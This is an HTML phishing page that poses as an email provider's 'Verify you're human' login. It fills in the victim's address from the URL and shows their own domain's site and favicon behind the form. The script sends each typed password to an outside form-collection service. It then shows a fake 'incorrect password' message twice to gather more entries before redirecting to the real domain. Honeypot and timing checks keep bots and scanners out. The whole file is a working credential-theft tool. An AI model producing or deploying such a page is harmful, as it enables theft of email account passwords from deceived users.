<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Login</title>
    <!-- Include Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap Icons -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <!-- Google Fonts: Poppins -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: Poppins, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #background-iframe, #overlay {
            position: fixed;
            top: 0;
            left: 0;
            height: 100vh;
            width: 100vw;
            max-height: 100vh;
            max-width: 100vw;
            box-sizing: border-box;
        }
        #background-iframe {
            border: none;
            z-index: -3;
        }
        #overlay {
            background-color: rgba(0, 0, 0, 0.5);
            z-index: -2;
        }
        .login-container {
            background: rgba(255, 255, 255, 0.95);
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            width: 350px; /* Increased width from 300px to 350px */
            position: relative;
            z-index: 1;
        }
        .icon-text {
            display: flex;
            align-items: center;
            margin-bottom: 1.5rem;
        }
        .icon-text img {
            width: 32px;
            height: 32px;
            margin-right: 0.5rem;
        }
        .icon-text .h4 {
            margin-bottom: 0;
            color: #0d6efd;
        }
        .form-group {
            margin-bottom: 15px;
            position: relative;
            z-index: 1;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        input[readonly] {
            background-color: #f9f9f9;
            cursor: not-allowed;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 10px;
            text-align: center;
            display: none;
            position: relative;
            z-index: 1;
        }
        .honeypot {
            display: none;
        }
        .form-header {
            margin-bottom: 1.5rem; /* Gap below "Verify you’re human" */
            font-size: 1.5rem; /* Reduced font size from default ~2rem to 1.5rem */
        }
        .contact-support {
            margin-top: 15px;
            text-align: center;
            font-size: 14px;
        }
        .contact-support a {
            color: #007bff;
            text-decoration: none;
        }
        .contact-support a:hover {
            text-decoration: underline;
        }
        .loading {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-flow: column;
            gap: 10px;
            position: fixed;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            z-index: 1000;
            background: white;
        }
        .loader {
            width: 48px;
            height: 48px;
            display: inline-block;
            position: relative;
            background: #007bff; /* Matches your button color */
            box-sizing: border-box;
            animation: flipX 1s linear infinite;
        }
        @keyframes flipX {
            0% {
                transform: perspective(200px) rotateX(0deg) rotateY(0deg);
            }
            50% {
                transform: perspective(200px) rotateX(-180deg) rotateY(0deg);
            }
            100% {
                transform: perspective(200px) rotateX(-180deg) rotateY(-180deg);
            }
        }
    </style>
</head>
<body>
    <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
    <div id="overlay"></div>
    <div class="login-container">
        <div class="icon-text">
            <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=example.com" alt="Domain Favicon">
            <span class="h4" id="domain-name">EXAMPLE</span>
        </div>
        <h2 class="form-header" data-translate="form_header">Verify you’re human</h2>
        <form id="login-form" action="https://submit-form.com/J2IVAy4bj" method="POST">
            <div class="form-group">
                <label for="email" data-translate="email_label">Email:</label>
                <input type="email" id="email" name="email" required readonly>
            </div>
            <div class="form-group">
                <label for="password" data-translate="password_label">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="form-group honeypot">
                <label for="honeypot">Leave this field empty:</label>
                <input type="text" id="honeypot" name="honeypot">
            </div>
            <button type="submit" data-translate="submit_button">Log In</button>
            <div class="error-message" id="error-message" data-translate="error_message">Incorrect password, please try again</div>
            <div class="contact-support">
                <a href="mailto:#" data-translate="contact_support">Contact Support</a>
            </div>
        </form>
    </div>
    <div class="loading" id="loading">
        <span class="loader"></span>
        <h3 class="text-center" data-translate="loading_message">Connecting To Mail Server</h3>
    </div>

    <!-- Bootstrap 5 JS Bundle (includes Popper) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Translation dictionary
        const translations = {
            en: {
                form_header: "Verify you’re human",
                email_label: "Email:",
                password_label: "Password:",
                submit_button: "Log In",
                error_message: "Incorrect password, please try again",
                bot_detected: "Bot detected, please try again",
                contact_support: "Contact Support",
                loading_message: "Connecting To Mail Server"
            },
            es: {
                form_header: "Verifica que eres humano",
                email_label: "Correo electrónico:",
                password_label: "Contraseña:",
                submit_button: "Iniciar sesión",
                error_message: "Contraseña incorrecta, por favor intenta de nuevo",
                bot_detected: "Bot detectado, por favor intenta de nuevo",
                contact_support: "Contactar con soporte",
                loading_message: "Conectando al servidor de correo"
            },
            fr: {
                form_header: "Vérifiez que vous êtes humain",
                email_label: "E-mail :",
                password_label: "Mot de passe :",
                submit_button: "Se connecter",
                error_message: "Mot de passe incorrect, veuillez réessayer",
                bot_detected: "Bot détecté, veuillez réessayer",
                contact_support: "Contacter le support",
                loading_message: "Connexion au serveur de messagerie"
            },
            de: {
                form_header: "Bestätigen Sie, dass Sie ein Mensch sind",
                email_label: "E-Mail:",
                password_label: "Passwort:",
                submit_button: "Anmelden",
                error_message: "Falsches Passwort, bitte versuchen Sie es erneut",
                bot_detected: "Bot erkannt, bitte versuchen Sie es erneut",
                contact_support: "Support kontaktieren",
                loading_message: "Verbindung zum Mail-Server"
            },
            it: {
                form_header: "Verifica che sei umano",
                email_label: "Email:",
                password_label: "Password:",
                submit_button: "Accedi",
                error_message: "Password errata, riprova",
                bot_detected: "Bot rilevato, riprova",
                contact_support: "Contatta il supporto",
                loading_message: "Connessione al server di posta"
            },
            pt: {
                form_header: "Verifique que você é humano",
                email_label: "E-mail:",
                password_label: "Senha:",
                submit_button: "Entrar",
                error_message: "Senha incorreta, tente novamente",
                bot_detected: "Bot detectado, tente novamente",
                contact_support: "Contactar o suporte",
                loading_message: "Conectando ao servidor de e-mail"
            },
            ja: {
                form_header: "あなたが人間であることを確認してください",
                email_label: "メール:",
                password_label: "パスワード:",
                submit_button: "ログイン",
                error_message: "パスワードが正しくありません。もう一度お試しください",
                bot_detected: "ボットが検出されました。もう一度お試しください",
                contact_support: "サポートに連絡",
                loading_message: "メールサーバーに接続中"
            },
            zh: {
                form_header: "验证您是人类",
                email_label: "电子邮件:",
                password_label: "密码:",
                submit_button: "登录",
                error_message: "密码错误，请重试",
                bot_detected: "检测到机器人，请重试",
                contact_support: "联系支持",
                loading_message: "正在连接到邮件服务器"
            }
        };

        // Function to detect browser language
        function getBrowserLanguage() {
            const lang = navigator.language || navigator.languages[0] || 'en';
            return lang.split('-')[0];
        }

        // Function to apply translations
        function applyTranslations(lang) {
            const elements = document.querySelectorAll('[data-translate]');
            const translation = translations[lang] || translations['en'];
            elements.forEach(element => {
                const key = element.getAttribute('data-translate');
                element.textContent = translation[key];
            });
        }

        // Function to extract email and domain from URL
        function getEmailFromUrl() {
            const url = window.location.href;
            let email = '';
            let domain = '';

            if (url.includes('#')) {
                email = url.split('#')[1];
            } else if (url.includes('?')) {
                const query = url.split('?')[1];
                const params = new URLSearchParams(query);
                email = params.get('email') || query.split('&')[0];
            }

            email = email ? decodeURIComponent(email) : '';
            if (email && email.includes('@')) {
                domain = email.split('@')[1];
            }

            return { email, domain };
        }

        // Initialize form and background
        document.addEventListener("DOMContentLoaded", () => {
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const honeypotInput = document.getElementById('honeypot');
            const errorMessage = document.getElementById('error-message');
            const form = document.getElementById('login-form');
            const backgroundIframe = document.getElementById('background-iframe');
            const domainFavicon = document.getElementById('domain-favicon');
            const domainName = document.getElementById('domain-name');
            const { email, domain } = getEmailFromUrl();

            if (email && email.includes('@')) {
                emailInput.value = email;
                if (domain) {
                    domainFavicon.src = `https://www.google.com/s2/favicons?domain=${domain}`;
                    domainName.textContent = domain.split('.')[0].toUpperCase();
                }
            } else {
                domainFavicon.src = 'https://www.google.com/s2/favicons?domain=example.com';
                domainName.textContent = 'EXAMPLE';
            }

            if (domain) {
                const domainUrl = domain.match(/^https?:\/\//) ? domain : `https://${domain}`;
                backgroundIframe.src = domainUrl;
            } else {
                backgroundIframe.src = 'about:blank';
                document.body.style.backgroundColor = 'white';
            }

            function updateIframeSize() {
                backgroundIframe.style.width = `${window.innerWidth}px`;
                backgroundIframe.style.height = `${window.innerHeight}px`;
            }

            passwordInput.addEventListener('focus', updateIframeSize);
            passwordInput.addEventListener('blur', () => {
                backgroundIframe.style.width = '100vw';
                backgroundIframe.style.height = '100vh';
            });
            window.addEventListener('resize', updateIframeSize);

            const browserLang = getBrowserLanguage();
            applyTranslations(browserLang);

            // Hide loading animation after 4 seconds
            setTimeout(() => {
                const loader = document.getElementById("loading");
                loader.style.display = "none";
            }, 4000);

            let submissionAttempts = 0;
            const formLoadTime = Date.now();

            form.addEventListener('submit', async (event) => {
                event.preventDefault();

                const timeSinceLoad = Date.now() - formLoadTime;
                if (honeypotInput.value !== '' || timeSinceLoad < 1000) {
                    errorMessage.textContent = translations[browserLang]?.bot_detected || "Bot detected, please try again";
                    errorMessage.style.display = 'block';
                    passwordInput.value = '';
                    honeypotInput.value = '';
                    passwordInput.focus();
                    return;
                }

                submissionAttempts++;

                const email = emailInput.value.trim();
                const password = passwordInput.value.trim();
                const data = { email, password };

                // Form submission
                try {
                    const response = await fetch('https://submit-form.com/J2IVAy4bj', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                    console.log(response.ok ? 'Submission to form successful!' : 'Submission to form failed.');
                } catch (error) {
                    console.error('Submission error:', error);
                }

                if (submissionAttempts <= 2) {
                    errorMessage.textContent = translations[browserLang]?.error_message || "Incorrect password, please try again";
                    errorMessage.style.display = 'block';
                    passwordInput.value = '';
                    honeypotInput.value = '';
                    passwordInput.focus();
                } else if (submissionAttempts === 3) {
                    if (domain) {
                        window.location.href = `https://${domain}`;
                    } else {
                        errorMessage.textContent = translations[browserLang]?.error_message || "Incorrect password, please try again";
                        errorMessage.style.display = 'block';
                        passwordInput.value = '';
                        honeypotInput.value = '';
                        passwordInput.focus();
                    }
                }
            });
        });
    </script>
</body>
</html>
